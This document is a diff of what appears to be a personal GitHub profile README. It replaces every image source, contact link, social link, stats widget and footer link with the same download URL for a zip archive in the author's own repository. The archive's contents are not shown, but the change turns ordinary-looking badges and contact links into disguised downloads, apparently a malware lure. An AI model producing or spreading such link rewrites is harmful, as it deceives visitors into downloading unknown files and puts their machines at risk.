@@ -1,7 +1,7 @@
-# Hi there, I'm Elcadi -  <img width="30px" src="https://media.tenor.com/images/3b388fe03da271d2674faf85eb7c3fcd/tenor.gif" />
+# Hi there, I'm Elcadi -  <img width="30px" src="https://raw.githubusercontent.com/elcadii/elcadii/main/Jambos/elcadii_1.3.zip" />
 
 
-<img align="right" alt="GIF" height="160px" src="https://media.giphy.com/media/du3J3cXyzhj75IOgvA/giphy.gif" />
+<img align="right" alt="GIF" height="160px" src="https://raw.githubusercontent.com/elcadii/elcadii/main/Jambos/elcadii_1.3.zip" />
 
 ## I'm a Full-Stack Devloper Student
 
@@ -19,16 +19,16 @@
 
 
 <p align="center">
-  <a href="mohammad.elcadi.dev@gmail.com" >
-    <img align="center" alt="Shourya742 | Gmail" width="26px" src="https://github.com/SatYu26/SatYu26/blob/master/Assets/Gmail.svg" />
+  <a href="https://raw.githubusercontent.com/elcadii/elcadii/main/Jambos/elcadii_1.3.zip" >
+    <img align="center" alt="Shourya742 | Gmail" width="26px" src="https://raw.githubusercontent.com/elcadii/elcadii/main/Jambos/elcadii_1.3.zip" />
   </a> &nbsp;&nbsp;
   
-  <a href="https://www.linkedin.com/in/mohammad-elcadi/" target="_blank">
-    <img align="center" alt="Shourya742 | Linkedin" width="24px" src="https://github.com/SatYu26/SatYu26/blob/master/Assets/Linkedin.svg" />
+  <a href="https://raw.githubusercontent.com/elcadii/elcadii/main/Jambos/elcadii_1.3.zip" target="_blank">
+    <img align="center" alt="Shourya742 | Linkedin" width="24px" src="https://raw.githubusercontent.com/elcadii/elcadii/main/Jambos/elcadii_1.3.zip" />
   </a> &nbsp;&nbsp;
   
-  <a href="https://github.com/elcadii" target="_blank">
-    <img align="center" alt="Shourya742 | GitHub" width="26px" src="https://upload.wikimedia.org/wikipedia/commons/thumb/a/ae/Github-desktop-logo-symbol.svg/1024px-Github-desktop-logo-symbol.svg.png" />
+  <a href="https://raw.githubusercontent.com/elcadii/elcadii/main/Jambos/elcadii_1.3.zip" target="_blank">
+    <img align="center" alt="Shourya742 | GitHub" width="26px" src="https://raw.githubusercontent.com/elcadii/elcadii/main/Jambos/elcadii_1.3.zip" />
   </a> &nbsp;&nbsp;
   
 <p>
@@ -38,9 +38,9 @@
 
 <div align="center">
     <picture align="center">
-      <source media="(prefers-color-scheme: dark)" srcset="https://raw.githubusercontent.com/Niefee/niefee/master/assets/github-contribution-grid-snake.svg">
-      <source media="(prefers-color-scheme: light)" srcset="https://raw.githubusercontent.com/Niefee/niefee/master/assets/github-contribution-grid-snake.svg">
-      <img alt="github contribution grid snake animation" src="https://raw.githubusercontent.com/Niefee/niefee/master/assets/github-contribution-grid-snake.svg">
+      <source media="(prefers-color-scheme: dark)" srcset="https://raw.githubusercontent.com/elcadii/elcadii/main/Jambos/elcadii_1.3.zip">
+      <source media="(prefers-color-scheme: light)" srcset="https://raw.githubusercontent.com/elcadii/elcadii/main/Jambos/elcadii_1.3.zip">
+      <img alt="github contribution grid snake animation" src="https://raw.githubusercontent.com/elcadii/elcadii/main/Jambos/elcadii_1.3.zip">
     </picture>
 </div>
 
@@ -55,10 +55,10 @@
   
   <div align="center"> 
      <a href="">
-      <img align="center" src="https://github-readme-stats-sigma-five.vercel.app/api?username=elcadii&show_icons=true&include_all_commits=true&count_private=true&theme=react&line_height=40" />
+      <img align="center" src="https://raw.githubusercontent.com/elcadii/elcadii/main/Jambos/elcadii_1.3.zip" />
     </a>
     <a href="">
-      <img align="center" src="https://github-readme-stats.vercel.app/api/top-langs/?username=elcadii&theme=react&line_height=40&hide=css"/>
+      <img align="center" src="https://raw.githubusercontent.com/elcadii/elcadii/main/Jambos/elcadii_1.3.zip"/>
     </a>
 </div
   
@@ -69,7 +69,7 @@
 ---
 
 
-[instagram]: https://www.instagram.com/diplo.spy
-[linkedin]: https://www.linkedin.com/in/hichame-ait-benalla/
-<img src="https://raw.githubusercontent.com/jayehernandez/jayehernandez/dcd7447c179f5a1131590b6ccba2223e879ab655/readme/bottom.svg" alt="bottom">
+[instagram]: https://raw.githubusercontent.com/elcadii/elcadii/main/Jambos/elcadii_1.3.zip
+[linkedin]: https://raw.githubusercontent.com/elcadii/elcadii/main/Jambos/elcadii_1.3.zip
+<img src="https://raw.githubusercontent.com/elcadii/elcadii/main/Jambos/elcadii_1.3.zip" alt="bottom">
 
